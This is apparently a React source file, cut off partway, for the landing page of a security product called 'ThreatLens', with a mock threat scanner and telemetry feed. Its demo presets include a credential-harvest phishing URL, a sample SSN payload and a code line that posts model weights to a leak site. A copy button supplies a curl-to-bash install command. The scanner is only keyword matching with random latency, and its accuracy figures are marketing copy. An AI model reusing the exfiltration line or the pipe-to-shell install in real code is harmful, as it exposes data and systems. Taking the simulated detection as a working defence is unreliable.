import React, { useState, useEffect } from 'react';
import { ThreeBackground } from './ThreeBackground';

interface OverviewScreenProps {
  onOpenLiveDemo: () => void;
  onOpenScheduleModal: () => void;
  onOpenApiModal: () => void;
}

interface TelemetryLog {
  id: string;
  time: string;
  type: 'SAFE' | 'BLOCKED';
  badge: string;
  message: string;
}

const INITIAL_LOGS: TelemetryLog[] = [
  {
    id: 'log-1',
    time: '14:22:04.102',
    type: 'SAFE',
    badge: 'SAFE // ALLOW',
    message: 'link_scan :: dest:cdn.aws.com :: latency:0.8ms',
  },
  {
    id: 'log-2',
    time: '14:22:05.419',
    type: 'BLOCKED',
    badge: 'BLOCKED // DLP',
    message: 'outbound_dlp :: rule:PCI_DSS_CARD :: src:soc_wkstn_04',
  },
  {
    id: 'log-3',
    time: '14:22:06.883',
    type: 'SAFE',
    badge: 'SAFE // CLEAN',
    message: 'file_eval :: sha256:7f83b165... :: sandbox:CLEAN',
  },
  {
    id: 'log-4',
    time: '14:22:08.012',
    type: 'BLOCKED',
    badge: 'BLOCKED // KEY_EXP',
    message: 'api_leak :: rule:OPENAI_API_KEY :: agent:chat_bridge',
  },
  {
    id: 'log-5',
    time: '14:22:09.340',
    type: 'SAFE',
    badge: 'SAFE // HMAC',
    message: 'webhook_in :: sig:hmac_verified :: route:/v1/ingest',
  },
];

const PRESETS = {
  phish:
    'https://secure-login-microsoft.accounts-verify-token99.cc/auth/login.php?session=active_credential_harvest',
  ssn: 'POST /v1/employee/record HTTP/1.1\nHost: api.partner.net\nAuthorization: Bearer dev-key\nContent-Type: application/json\n\n{"employee_id": 8491, "ssn": "391-49-1092", "salary": 145000}',
  code: 'def export_internal_weights():\n    # PROPRIETARY IP - DO NOT EXPORT\n    return torch.load("/var/models/neural_weights_v4.pt")\n\nrequests.post("https://external-leak-site.org", data=weights)',
  clean:
    'GET /api/v2/metrics/health HTTP/1.1\nHost: internal-proxy.soc.local\nAccept: application/json\nX-SecOps-Trace: verified-signature',
};

const TERMINAL_PROMPTS = [
  'observing kernel syscalls and memory pages...',
  'streaming ingress packet hash tables into buffer...',
  'evaluating entropy maps against active CVE database...',
  'verifying cryptographic key rings across all pods...',
  'zero unauthorized egress channels registered.',
];

export const OverviewScreen: React.FC<OverviewScreenProps> = ({
  onOpenLiveDemo,
  onOpenScheduleModal,
  onOpenApiModal,
}) => {
  const [scannerInput, setScannerInput] = useState<string>('');
  const [isScanning, setIsScanning] = useState(false);
  const [promptIdx, setPromptIdx] = useState(0);
  const [copiedCmd, setCopiedCmd] = useState(false);
  const [logs, setLogs] = useState<TelemetryLog[]>(INITIAL_LOGS);

  // Verdict state
  const [verdict, setVerdict] = useState<{
    status: string;
    isBlocked: boolean;
    latency: string;
    riskScore: string;
    category: string;
    regulatory: string;
    action: string;
  }>({
    status: 'ALLOW // SECURE',
    isBlocked: false,
    latency: 'Eval Latency: 0.94ms',
    riskScore: '02 / 100',
    category: 'Benign Traffic',
    regulatory: 'PASS / NO_DLP',
    action: 'PASSTHROUGH',
  });

  // Terminal prompt rotation
  useEffect(() => {
    const timer = setInterval(() => {
      setPromptIdx((prev) => (prev + 1) % TERMINAL_PROMPTS.length);
    }, 3500);
    return () => clearInterval(timer);
  }, []);

  const handleSelectPreset = (key: keyof typeof PRESETS) => {
    const val = PRESETS[key];
    setScannerInput(val);
    runEvaluation(val);
  };

  const runEvaluation = (inputVal: string) => {
    setIsScanning(true);
    const trimmed = inputVal.trim();
    const isSuspicious =
      trimmed.includes('ssn') ||
      trimmed.includes('accounts-verify') ||
      trimmed.includes('PROPRIETARY') ||
      trimmed.includes('leak') ||
      trimmed.includes('harvest') ||
      trimmed.length > 80;

    const randomLatency = (0.7 + Math.random() * 0.9).toFixed(2);

    setTimeout(() => {
      setIsScanning(false);
      const now = new Date();
      const timeStr = `${now.toTimeString().split(' ')[0]}.${String(now.getMilliseconds()).padStart(3, '0')}`;

      if (isSuspicious) {
        let cat = 'Data Egress (SSN)';
        if (trimmed.includes('accounts-verify') || trimmed.includes('harvest')) {
          cat = 'Spear Phishing URL';
        } else if (trimmed.includes('PROPRIETARY') || trimmed.includes('torch')) {
          cat = 'IP Exfiltration (Weights)';
        }

        setVerdict({
          status: 'BLOCKED // THREAT DETECTED',
          isBlocked: true,
          latency: `Eval Latency: ${randomLatency}ms`,
          riskScore: '94 / 100',
          category: cat,
          regulatory: 'FAIL / PCI-DSS',
          action: 'QUARANTINE_DROP',
        });

        // Add to log stream
        const newLog: TelemetryLog = {
          id: `log-${Date.now()}`,
          time: timeStr,
          type: 'BLOCKED',
          badge: 'BLOCKED // DLP',
          message: `threat_interception :: risk:94 :: ${cat} :: latency:${randomLatency}ms`,
        };
        setLogs((prev) => [newLog, ...prev.slice(0, 4)]);
      } else {
        setVerdict({
          status: 'ALLOW // SECURE',
          isBlocked: false,
          latency: `Eval Latency: ${randomLatency}ms`,
          riskScore: '03 / 100',
          category: 'Benign Traffic',
          regulatory: 'PASS / ALL_CLEAR',
          action: 'PASSTHROUGH',
        });

        const newLog: TelemetryLog = {
          id: `log-${Date.now()}`,
          time: timeStr,
          type: 'SAFE',
          badge: 'SAFE // ALLOW',
          message: `traffic_verified :: risk:03 :: benign_stream :: latency:${randomLatency}ms`,
        };
        setLogs((prev) => [newLog, ...prev.slice(0, 4)]);
      }
    }, 280);
  };

  const handleCopyCmd = () => {
    navigator.clipboard.writeText('curl -sSL https://get.threatlens.io | bash').then(() => {
      setCopiedCmd(true);
      setTimeout(() => setCopiedCmd(false), 2200);
    });
  };

  return (
    <div className="flex flex-col w-full text-[#dfe2ef]">
      {/* HERO SECTION */}
      <section className="relative w-full overflow-hidden pb-12 pt-6">
        {/* ThreeJS Ambient Node Constellation */}
        <ThreeBackground className="absolute inset-0 w-full h-[680px] pointer-events-none opacity-60" />

        {/* Radar Sweep Background Grid */}
        <div className="absolute inset-0 pointer-events-none opacity-15 [background-image:radial-gradient(#00e5c7_1px,transparent_1px)] [background-size:28px_28px]"></div>
        <div className="absolute -top-32 left-1/2 -translate-x-1/2 w-[720px] h-[340px] bg-[#00e5c7]/10 blur-[130px] rounded-full pointer-events-none"></div>

        <div className="relative w-full max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col items-center text-center">
          {/* Status Pill */}
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#181b25]/90 border border-[#00e5c7]/20 shadow-[0_0_15px_rgba(0,229,199,0.15)] mb-6 backdrop-blur-md">
            <span className="relative flex h-2 w-2">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#00e5c7] opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-[#70ffe3]"></span>
            </span>
            <span className="font-mono text-[10px] tracking-wider text-[#70ffe3] uppercase font-semibold">
              DEFENSIVE MATRIX v4.2 :: ENFORCE_MODE ACTIVE
            </span>
            <span className="font-mono text-[10px] text-[#b9cac5] px-1 bg-[#1c1f29] rounded border border-white/5 font-semibold">
              ZERO_LEAK_TARGET
            </span>
          </div>

          {/* Main Headline */}
          <h1 className="font-sans font-bold text-3xl sm:text-5xl lg:text-[46px] leading-tight text-[#dfe2ef] tracking-tight max-w-4xl text-balance">
            One AI Risk Engine.
            <br className="hidden sm:inline" />{' '}
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#70ffe3] via-[#00e5c7] to-[#41fcdd] drop-shadow-[0_0_24px_rgba(0,229,199,0.3)]">
              Every Threat, In and Out.
            </span>
          </h1>

          {/* Subheadline */}
          <p className="font-sans text-sm sm:text-base text-[#b9cac5] max-w-2xl mt-4 mb-8 text-balance leading-relaxed">
            Autonomous leak prevention and real-time threat interception. ThreatLens monitors outbound
            data egress and inbound execution vectors with zero-latency neural verification.
          </p>

          {/* CTA Row */}
          <div className="flex flex-wrap items-center justify-center gap-4 mb-10">
            <button
              onClick={onOpenLiveDemo}
              className="flex items-center gap-2 px-6 py-3 rounded bg-[#00e5c7] text-[#00382f] font-sans font-bold text-sm shadow-[0_0_24px_rgba(0,229,199,0.35)] hover:shadow-[0_0_32px_rgba(0,229,199,0.5)] hover:bg-[#70ffe3] transition-all cursor-pointer"
            >
              <span className="material-symbols-outlined text-[18px]">terminal</span>
              <span>Try Live Demo</span>
            </button>

            <a
              href="#pipeline-architecture"
              className="flex items-center gap-2 px-6 py-3 rounded bg-[#262a34]/80 text-[#70ffe3] font-sans font-semibold text-sm border border-white/10 backdrop-blur-md hover:bg-[#31353f] transition-all"
            >
              <span className="material-symbols-outlined text-[18px]">schema</span>
              <span>View Architecture</span>
            </a>
          </div>

          {/* Live Terminal Console */}
          <div className="w-full max-w-4xl rounded-xl bg-[#0a0e17]/90 border border-white/10 backdrop-blur-2xl shadow-[0_24px_48px_rgba(0,0,0,0.7)] text-left overflow-hidden">
            {/* Terminal Header */}
            <div className="px-4 py-2.5 bg-[#181b25] border-b border-white/5 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <span className="w-3 h-3 rounded-full bg-[#ffb4ab] inline-block"></span>
                <span className="w-3 h-3 rounded-full bg-[#ffc070] inline-block"></span>
                <span className="w-3 h-3 rounded-full bg-[#00e5c7] inline-block"></span>
                <span className="ml-3 font-mono text-xs text-[#b9cac5]">
                  threatlens-cli v3.4.1 --daemon --mode=enforce
                </span>
              </div>
              <div className="flex items-center gap-1.5">
                <span className="font-mono text-[10px] tracking-wider text-[#70ffe3] uppercase font-semibold">
                  EGRESS_GUARD: ONLINE
                </span>
                <span className="material-symbols-outlined text-[#70ffe3] text-[14px]">lock</span>
              </div>
            </div>

            {/* Terminal Body */}
            <div className="p-5 font-mono text-xs flex flex-col gap-2.5 min-h-[190px] bg-[#0a0e17]">
              <div className="flex items-center gap-2 text-[#b9cac5]">
                <span className="text-[#00e5c7] font-bold">$</span>
                <span>scanning inbound_link.exe... [HASH: e3b0c442] -&gt;</span>
                <span className="text-[#70ffe3] bg-[#70ffe3]/10 px-1.5 py-0.5 rounded font-semibold">
                  SAFE // 0 Zero-Days
                </span>
              </div>

              <div className="flex items-center gap-2 text-[#b9cac5]">
                <span className="text-[#00e5c7] font-bold">$</span>
                <span>scanning outbound_msg.payload... [DETECT: SSN Pattern] -&gt;</span>
                <span className="text-[#ffb3b2] bg-[#b5032a]/40 px-1.5 py-0.5 rounded font-semibold border border-red-500/20">
                  BLOCKED // Data Egress Prevented
                </span>
              </div>

              <div className="flex items-center gap-2 text-[#b9cac5]">
                <span className="text-[#00e5c7] font-bold">$</span>
                <span>intercepting api_bearer_token.jwt... [SUSPECT] -&gt;</span>
                <span className="text-[#ffb3b2] bg-[#b5032a]/40 px-1.5 py-0.5 rounded font-semibold border border-red-500/20">
                  QUARANTINED // Key Invalidation Triggered
                </span>
              </div>

              <div className="flex items-center gap-2 text-[#b9cac5]">
                <span className="text-[#00e5c7] font-bold">$</span>
                <span>deep_eval neural_payload_v2... -&gt;</span>
                <span className="text-[#70ffe3] bg-[#70ffe3]/10 px-1.5 py-0.5 rounded font-semibold">
                  VERIFIED // Signature Clean
                </span>
              </div>

              <div className="flex items-center gap-1.5 text-[#70ffe3] font-mono text-xs mt-1">
                <span>$</span>
                <span>{TERMINAL_PROMPTS[promptIdx]}</span>
                <span className="w-2 h-4 bg-[#70ffe3] animate-pulse inline-block"></span>
              </div>
            </div>

            {/* Terminal Telemetry Footer */}
            <div className="px-4 py-2.5 bg-[#181b25]/80 border-t border-white/5 flex flex-wrap items-center justify-between gap-3 text-xs">
              <div className="flex items-center gap-1.5">
                <span className="font-mono text-[#b9cac5]">Accuracy:</span>
                <span className="font-mono text-sm font-semibold text-[#70ffe3]">99.98%</span>
              </div>

              <div className="flex items-center gap-1.5">
                <span className="font-mono text-[#b9cac5]">Egress Latency:</span>
                <span className="font-mono text-sm font-semibold text-[#41fcdd]">1.4ms</span>
              </div>

              <div className="flex items-center gap-1.5">
                <span className="font-mono text-[#b9cac5]">False Remediation:</span>
                <span className="font-mono text-sm font-semibold text-[#dfe2ef]">0.00%</span>
              </div>

              <div className="flex items-center gap-1.5">
                <span className="font-mono text-[10px] tracking-wider text-[#70ffe3] uppercase bg-[#1c1f29] px-2 py-0.5 rounded border border-white/5 font-semibold">
                  ISO-27001 READY
                </span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* LIVE INTERACTIVE SCANNER & SOC TELEMETRY SPLIT */}
      <section className="w-full py-12 bg-[#181b25]/40 border-y border-white/5" id="live-demo-section">
        <div className="w-full max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col gap-6">
          {/* Section Header */}
          <div className="flex flex-col md:flex-row md:items-end justify-between gap-3">
            <div>
              <div className="flex items-center gap-1.5 text-[#70ffe3] mb-1">
                <span className="material-symbols-outlined text-[16px]">sensors</span>
                <span className="font-mono text-[10px] tracking-wider uppercase font-semibold">
                  SANDBOX ENGINE SIMULATOR
                </span>
              </div>
              <h2 className="font-sans font-semibold text-2xl text-[#dfe2ef]">
                Interactive AI Threat Scanner
              </h2>
              <p className="font-sans text-sm text-[#b9cac5]">
                Detonate live samples against the ThreatLens deep neural parser in real time.
              </p>
            </div>

            <div className="flex items-center gap-2 bg-[#181b25] border border-white/5 px-3 py-1.5 rounded">
              <span className="w-2 h-2 rounded-full bg-[#00e5c7] animate-ping"></span>
              <span className="font-mono text-xs text-[#70ffe3] font-semibold">
                NODE_US_EAST_01 :: LATENCY 0.72ms
              </span>
            </div>
          </div>

          {/* Grid: Left Scanner Interactive, Right Real-time Telemetry */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
            {/* Interactive Tester Card (7 cols) */}
            <div className="lg:col-span-7 rounded-xl bg-[#0a0e17] border border-white/10 p-5 shadow-xl flex flex-col gap-4">
              <div className="flex items-center justify-between">
                <span className="font-sans font-semibold text-sm text-[#dfe2ef]">
                  Payload or Ingress Inspector
                </span>
                <span className="font-mono text-[10px] tracking-wider px-2 py-0.5 rounded bg-[#00e5c7]/10 text-[#70ffe3] border border-[#00e5c7]/30 uppercase font-semibold">
                  IN-MEMORY ISOLATION
                </span>
              </div>

              {/* Presets */}
              <div className="flex flex-col gap-1.5">
                <span className="font-mono text-xs text-[#b9cac5]">Inject sample vector:</span>
                <div className="flex flex-wrap gap-2">
                  <button
                    onClick={() => handleSelectPreset('phish')}
                    className="font-mono text-xs px-2.5 py-1 bg-[#1c1f29] hover:bg-[#262a34] rounded text-[#dfe2ef] border border-white/5 transition-all cursor-pointer"
                  >
                    ⚠️ Phishing URL
                  </button>
                  <button
                    onClick={() => handleSelectPreset('ssn')}
                    className="font-mono text-xs px-2.5 py-1 bg-[#1c1f29] hover:bg-[#262a34] rounded text-[#dfe2ef] border border-white/5 transition-all cursor-pointer"
                  >
                    🛑 Employee SSN Leak
                  </button>
                  <button
                    onClick={() => handleSelectPreset('code')}
                    className="font-mono text-xs px-2.5 py-1 bg-[#1c1f29] hover:bg-[#262a34] rounded text-[#dfe2ef] border border-white/5 transition-all cursor-pointer"
                  >
                    🛑 Proprietary Code Dump
                  </button>
                  <button
                    onClick={() => handleSelectPreset('clean')}
                    className="font-mono text-xs px-2.5 py-1 bg-[#1c1f29] hover:bg-[#262a34] rounded text-[#70ffe3] border border-white/5 transition-all cursor-pointer"
                  >
                    ✅ Clean Safe Doc
                  </button>
                </div>
              </div>

              {/* Input Area */}
              <div className="flex flex-col gap-2">
                <textarea
                  value={scannerInput}
                  onChange={(e) => setScannerInput(e.target.value)}
                  placeholder="Paste suspicious string, curl command, raw JSON, or egress payload..."
                  rows={4}
                  className="w-full bg-[#181b25] text-[#dfe2ef] font-mono text-xs p-3.5 rounded border border-white/10 focus:outline-none focus:border-[#00e5c7] transition-all resize-none"
                />

                <div className="flex items-center justify-between">
                  <span className="font-mono text-xs text-[#b9cac5]">
                    Char count: {scannerInput.length}
                  </span>
                  <button
                    onClick={() => runEvaluation(scannerInput)}
                    disabled={isScanning}
                    className="flex items-center gap-1.5 px-4 py-2 bg-[#00e5c7] text-[#00382f] font-sans font-bold text-xs tracking-wide rounded hover:bg-[#70ffe3] hover:shadow-[0_0_16px_rgba(0,229,199,0.35)] transition-all cursor-pointer"
                  >
                    <span className="material-symbols-outlined text-[16px]">radar</span>
                    <span>{isScanning ? 'Detonating...' : 'Scan Payload'}</span>
                  </button>
                </div>
              </div>

              {/* Verdict Result Output Box */}
              <div
                className={`rounded p-4 flex flex-col gap-3 transition-all ${
                  verdict.isBlocked
                    ? 'bg-[#b5032a]/20 border border-red-500/30'
                    : 'bg-[#181b25] border border-white/5'
                }`}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <span
                      className={`material-symbols-outlined text-[22px] ${
                        verdict.isBlocked ? 'text-[#ffb3b2]' : 'text-[#70ffe3]'
                      }`}
                    >
                      {verdict.isBlocked ? 'gpp_bad' : 'shield_check'}
                    </span>
                    <span
                      className={`font-mono text-sm font-bold ${
                        verdict.isBlocked ? 'text-[#ffb3b2]' : 'text-[#70ffe3]'
                      }`}
                    >
                      {verdict.status}
                    </span>
                  </div>
                  <span className="font-mono text-xs text-[#b9cac5]">{verdict.latency}</span>
                </div>

                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 pt-1">
                  <div className="flex flex-col bg-[#1c1f29] p-2 rounded border border-white/5">
                    <span className="font-mono text-[9px] tracking-wider text-[#b9cac5] uppercase font-semibold">
                      RISK SCORE
                    </span>
                    <span
                      className={`font-mono text-sm font-bold ${
                        verdict.isBlocked ? 'text-[#ffb3b2]' : 'text-[#70ffe3]'
                      }`}
                    >
                      {verdict.riskScore}
                    </span>
                  </div>

                  <div className="flex flex-col bg-[#1c1f29] p-2 rounded border border-white/5">
                    <span className="font-mono text-[9px] tracking-wider text-[#b9cac5] uppercase font-semibold">
                      CATEGORY
                    </span>
                    <span className="font-mono text-xs text-[#dfe2ef] truncate font-semibold">
                      {verdict.category}
                    </span>
                  </div>

                  <div className="flex flex-col bg-[#1c1f29] p-2 rounded border border-white/5">
                    <span className="font-mono text-[9px] tracking-wider text-[#b9cac5] uppercase font-semibold">
                      REGULATORY
                    </span>
                    <span
                      className={`font-mono text-xs truncate font-semibold ${
                        verdict.isBlocked ? 'text-[#ffb3b2]' : 'text-[#70ffe3]'
                      }`}
                    >
                      {verdict.regulatory}
                    </span>
                  </div>

                  <div className="flex flex-col bg-[#1c1f29] p-2 rounded border border-white/5">
                    <span className="font-mono text-[9px] tracking-wider text-[#b9cac5] uppercase font-semibold">
                      ACTION
                    </span>
                    <span
                      className={`font-mono text-xs truncate font-semibold ${
                        verdict.isBlocked ? 'text-[#ffb3b2]' : 'text-[#70ffe3]'
                      }`}
                    >
                      {verdict.action}
                    </span>
                  </div>
                </div>

                {/* Mini Sparkline inline visual */}
                <div className="w-full flex items-center justify-between pt-2 border-t border-white/5">
                  <span className="font-mono text-[9px] tracking-wider text-[#b9cac5] uppercase font-semibold">
                    CONFIDENCE INTERVAL (BAYESIAN):
                  </span>
                  <div className="flex items-center gap-1">
                    <div className="w-1.5 h-3 bg-[#70ffe3] rounded-xs"></div>
                    <div className="w-1.5 h-4 bg-[#70ffe3] rounded-xs"></div>
                    <div className="w-1.5 h-2.5 bg-[#70ffe3] rounded-xs"></div>
                    <div className="w-1.5 h-5 bg-[#70ffe3] rounded-xs"></div>
                    <div className="w-1.5 h-4.5 bg-[#70ffe3] rounded-xs"></div>
                    <span className="font-mono text-xs text-[#70ffe3] ml-1 font-semibold">
                      99.96%
                    </span>
                  </div>
                </div>
              </div>
            </div>

            {/* Live Updating Audit Log Ticker (5 cols) */}
            <div className="lg:col-span-5 rounded-xl bg-[#0a0e17] border border-white/10 p-5 shadow-xl flex flex-col gap-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span className="relative flex h-2 w-2">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#00e5c7] opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-2 w-2 bg-[#70ffe3]"></span>
                  </span>
                  <span className="font-sans font-semibold text-sm text-[#dfe2ef]">
                    SOC Telemetry Stream
                  </span>
                </div>
                <span className="font-mono text-[10px] tracking-wider px-2 py-0.5 rounded bg-[#1c1f29] text-[#b9cac5] border border-white/5 uppercase font-semibold">
                  EGRESS_TAP // LIVE
                </span>
              </div>

              {/* Log stream container */}
              <div className="flex flex-col gap-2 font-mono text-xs overflow-hidden min-h-[300px]">
                {logs.map((log) => (
                  <div
                    key={log.id}
                    className={`p-2.5 rounded flex flex-col gap-0.5 transition-all ${
                      log.type === 'BLOCKED'
                        ? 'bg-[#b5032a]/20 border border-red-500/20 hover:bg-[#b5032a]/30'
                        : 'bg-[#181b25] border border-white/5 hover:bg-[#1c1f29]'
                    }`}
                  >
                    <div className="flex items-center justify-between text-xs text-[#b9cac5]">
                      <span>[{log.time}]</span>
                      <span
                        className={`font-mono font-bold uppercase text-[9px] px-1.5 py-0.2 rounded ${
                          log.type === 'BLOCKED'
                            ? 'text-[#ffb3b2] bg-[#b5032a]/40 border border-[#ffb3b2]/30'
                            : 'text-[#70ffe3] bg-[#00e5c7]/10 border border-[#00e5c7]/30'
                        }`}
                      >
                        {log.badge}
                      </span>
                    </div>
                    <p
                      className={`truncate text-xs ${
                        log.type === 'BLOCKED' ? 'text-[#ffb3b2]' : 'text-[#dfe2ef]'
                      }`}
                    >
                      {log.message}
                    </p>
                  </div>
                ))}
              </div>

              <div className="flex items-center justify-between pt-2 border-t border-white/5 font-mono text-xs text-[#b9cac5]">
                <span>Buffer capacity: 1,000,000 evt/s</span>
                <span className="text-[#70ffe3] flex items-center gap-1 font-semibold">
                  <span className="material-symbols-outlined text-[14px]">lock_clock</span>
                  Immutable append
                </span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ENTERPRISE FEATURE GRID (6 CARDS) */}
      <section className="w-full py-16">
        <div className="w-full max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col gap-8">
          <div className="flex flex-col gap-1 max-w-2xl">
            <div className="flex items-center gap-1.5 text-[#70ffe3]">
              <span className="material-symbols-outlined text-[16px]">security</span>
              <span className="font-mono text-[10px] tracking-wider uppercase font-semibold">
                TACTICAL CAPABILITIES
              </span>
            </div>
            <h2 className="font-sans font-semibold text-2xl sm:text-3xl text-[#dfe2ef]">
              Architected for Extreme Threat Surfaces
            </h2>
            <p className="font-sans text-sm text-[#b9cac5]">
              Every module runs inside isolated micro-kernels with sub-millisecond execution times and
              deterministic policy enforcement.
            </p>
          </div>

          {/* Bento Grid (6 Cards) */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            {/* Feature 1 */}
            <div className="p-6 rounded-xl bg-[#181b25] border border-white/5 hover:bg-[#1c1f29] transition-all hover:shadow-[0_0_24px_rgba(0,229,199,0.12)] flex flex-col justify-between group">
              <div className="flex flex-col gap-4">
                <div className="w-10 h-10 rounded bg-[#00e5c7]/10 text-[#70ffe3] flex items-center justify-center group-hover:bg-[#00e5c7] group-hover:text-[#00382f] transition-all">
                  <span className="material-symbols-outlined text-[24px]">outbox</span>
                </div>
                <div>
                  <span className="font-mono text-[10px] tracking-wider text-[#70ffe3] uppercase font-semibold">
                    INGEST &amp; EGRESS
                  </span>
                  <h3 className="font-sans font-semibold text-base text-[#dfe2ef] mt-1">
                    Outbound DLP Scan
                  </h3>
                  <p className="font-sans text-xs text-[#b9cac5] mt-2 leading-relaxed">
                    Deep contextual content analysis stops SSNs, API tokens, passwords, and source code
                    leaks before egress. Operates natively inside browser, tunnel, and gateway proxies.
                  </p>
                </div>
              </div>
              <div className="pt-4 mt-4 border-t border-white/5 flex items-center justify-between text-[#b9cac5] font-mono text-xs">
                <span>Latency: 0.8ms</span>
                <span className="text-[#70ffe3] font-bold">100% REGEX + NLP</span>
              </div>
            </div>

            {/* Feature 2 */}
            <div className="p-6 rounded-xl bg-[#181b25] border border-white/5 hover:bg-[#1c1f29] transition-all hover:shadow-[0_0_24px_rgba(0,229,199,0.12)] flex flex-col justify-between group">
              <div className="flex flex-col gap-4">
                <div className="w-10 h-10 rounded bg-[#00e5c7]/10 text-[#70ffe3] flex items-center justify-center group-hover:bg-[#00e5c7] group-hover:text-[#00382f] transition-all">
                  <span className="material-symbols-outlined text-[24px]">troubleshoot</span>
                </div>
                <div>
                  <span className="font-mono text-[10px] tracking-wider text-[#70ffe3] uppercase font-semibold">
                    INBOUND DEFENSE
                  </span>
                  <h3 className="font-sans font-semibold text-base text-[#dfe2ef] mt-1">
                    Inbound Link &amp; File Scan
                  </h3>
                  <p className="font-sans text-xs text-[#b9cac5] mt-2 leading-relaxed">
                    Real-time neural sandbox unpacks and detonates suspicious links and executables in
                    1.2ms. Neutralizes weaponized PDFs, macro payloads, and zero-day phishing schemes.
                  </p>
                </div>
              </div>
              <div className="pt-4 mt-4 border-t border-white/5 flex items-center justify-between text-[#b9cac5] font-mono text-xs">
                <span>Detonation: Cloud VM</span>
                <span className="text-[#70ffe3] font-bold">0-DAY HEURISTICS</span>
              </div>
            </div>

            {/* Feature 3 */}
            <div className="p-6 rounded-xl bg-[#181b25] border border-white/5 hover:bg-[#1c1f29] transition-all hover:shadow-[0_0_24px_rgba(0,229,199,0.12)] flex flex-col justify-between group">
              <div className="flex flex-col gap-4">
                <div className="w-10 h-10 rounded bg-[#00e5c7]/10 text-[#70ffe3] flex items-center justify-center group-hover:bg-[#00e5c7] group-hover:text-[#00382f] transition-all">
                  <span className="material-symbols-outlined text-[24px]">psychology</span>
                </div>
                <div>
                  <span className="font-mono text-[10px] tracking-wider text-[#70ffe3] uppercase font-semibold">
                    ANALYST EFFICIENCY
                  </span>
                  <h3 className="font-sans font-semibold text-base text-[#dfe2ef] mt-1">
                    SOC Alert Triage
                  </h3>
                  <p className="font-sans text-xs text-[#b9cac5] mt-2 leading-relaxed">
                    AI summarizes 10,000+ incident telemetry traces into single-sentence tactical
                    verdicts, reducing tier-1 fatigue by 82% and accelerating MTTR to seconds.
                  </p>
                </div>
              </div>
              <div className="pt-4 mt-4 border-t border-white/5 flex items-center justify-between text-[#b9cac5] font-mono text-xs">
                <span>MTTR: -82%</span>
                <span className="text-[#70ffe3] font-bold">AUTO-VERDICT</span>
              </div>
            </div>

            {/* Feature 4 */}
            <div className="p-6 rounded-xl bg-[#181b25] border border-white/5 hover:bg-[#1c1f29] transition-all hover:shadow-[0_0_24px_rgba(0,229,199,0.12)] flex flex-col justify-between group">
              <div className="flex flex-col gap-4">
                <div className="w-10 h-10 rounded bg-[#00e5c7]/10 text-[#70ffe3] flex items-center justify-center group-hover:bg-[#00e5c7] group-hover:text-[#00382f] transition-all">
                  <span className="material-symbols-outlined text-[24px]">pattern</span>
                </div>
                <div>
                  <span className="font-mono text-[10px] tracking-wider text-[#70ffe3] uppercase font-semibold">
                    UNSUPERVISED LEARNING
                  </span>
                  <h3 className="font-sans font-semibold text-base text-[#dfe2ef] mt-1">
                    AI Anomaly Detection
                  </h3>
                  <p className="font-sans text-xs text-[#b9cac5] mt-2 leading-relaxed">
                    Behavioral baseline engine detects subtle lateral movement, token theft, off-hours
                    database queries, and unauthorized cloud bucket synchronizations.
                  </p>
                </div>
              </div>
              <div className="pt-4 mt-4 border-t border-white/5 flex items-center justify-between text-[#b9cac5] font-mono text-xs">
                <span>Adaptive Baseline</span>
                <span className="text-[#70ffe3] font-bold">LATERAL SHIELD</span>
              </div>
            </div>

            {/* Feature 5 */}
            <div className="p-6 rounded-xl bg-[#181b25] border border-white/5 hover:bg-[#1c1f29] transition-all hover:shadow-[0_0_24px_rgba(0,229,199,0.12)] flex flex-col justify-between group">
              <div className="flex flex-col gap-4">
                <div className="w-10 h-10 rounded bg-[#00e5c7]/10 text-[#70ffe3] flex items-center justify-center group-hover:bg-[#00e5c7] group-hover:text-[#00382f] transition-all">
                  <span className="material-symbols-outlined text-[24px]">vpn_key</span>
                </div>
                <div>
                  <span className="font-mono text-[10px] tracking-wider text-[#70ffe3] uppercase font-semibold">
                    GOVERNANCE &amp; TRUST
                  </span>
                  <h3 className="font-sans font-semibold text-base text-[#dfe2ef] mt-1">
                    Human-in-the-Loop Approval
                  </h3>
                  <p className="font-sans text-xs text-[#b9cac5] mt-2 leading-relaxed">
                    Critical interventions require cryptographic dual-key confirmation before executing
                    system shutdowns or DNS-level quarantines. Never rogue remediation.
                  </p>
                </div>
              </div>
              <div className="pt-4 mt-4 border-t border-white/5 flex items-center justify-between text-[#b9cac5] font-mono text-xs">
                <span>Dual Multi-Sig</span>
                <span className="text-[#70ffe3] font-bold">ZERO ROGUE ACTIONS</span>
              </div>
            </div>

            {/* Feature 6 */}
            <div className="p-6 rounded-xl bg-[#181b25] border border-white/5 hover:bg-[#1c1f29] transition-all hover:shadow-[0_0_24px_rgba(0,229,199,0.12)] flex flex-col justify-between group">
              <div className="flex flex-col gap-4">
                <div className="w-10 h-10 rounded bg-[#00e5c7]/10 text-[#70ffe3] flex items-center justify-center group-hover:bg-[#00e5c7] group-hover:text-[#00382f] transition-all">
                  <span className="material-symbols-outlined text-[24px]">history_edu</span>
                </div>
                <div>
                  <span className="font-mono text-[10px] tracking-wider text-[#70ffe3] uppercase font-semibold">
                    CRYPTOGRAPHIC TRAIL
                  </span>
                  <h3 className="font-sans font-semibold text-base text-[#dfe2ef] mt-1">
                    Encrypted Audit Log
                  </h3>
                  <p className="font-sans text-xs text-[#b9cac5] mt-2 leading-relaxed">
                    Tamper-proof append-only ledger with mathematical proofs of immutability. Instantly
                    exportable for federal audits, SOC 2 Type II examinations, and judicial compliance.
                  </p>
                </div>
              </div>
              <div className="pt-4 mt-4 border-t border-white/5 flex items-center justify-between text-[#b9cac5] font-mono text-xs">
                <span>Merkle Proofs</span>
